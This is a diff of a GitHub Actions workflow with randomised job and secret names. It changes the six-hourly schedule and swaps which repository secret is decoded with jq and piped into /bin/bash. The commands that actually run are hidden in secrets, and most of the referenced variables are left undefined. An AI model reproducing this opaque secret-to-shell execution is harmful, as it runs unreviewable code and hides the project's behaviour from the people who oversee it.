@@ -1,24 +1,21 @@
 name: shisuanjian3489
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 3/6 * * *'
+    - cron: '4 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: shisuanjian3489
         env:
-          cgpxl940: ${{ secrets.cgpxl940 }}
+          o4215: ${{ secrets.o4215 }}
         run: |
-          echo $cgpxl940 | jq -r .mqxxf3353 | /bin/bash
-          echo $w406 | jq -r .az4209 | /bin/bash
-          echo $im26 | jq -r .qxd73 | /bin/bash
-          echo $qacl453 | jq -r .bq32 | /bin/bash
-          echo $tl4 | jq -r .c69331 | /bin/bash
-          echo $ce9257 | jq -r .r4894 | /bin/bash
-          echo $nmsoo7852 | jq -r .zty8737 | /bin/bash
-          echo $uyo615 | jq -r .pkepc83 | /bin/bash
+          echo $o4215 | jq -r .ag040 | /bin/bash
+          echo $thkyk77161 | jq -r .rkwg8990 | /bin/bash
+          echo $ur94127 | jq -r .uy7 | /bin/bash
+          echo $hi946 | jq -r .xsxed8657 | /bin/bash
 
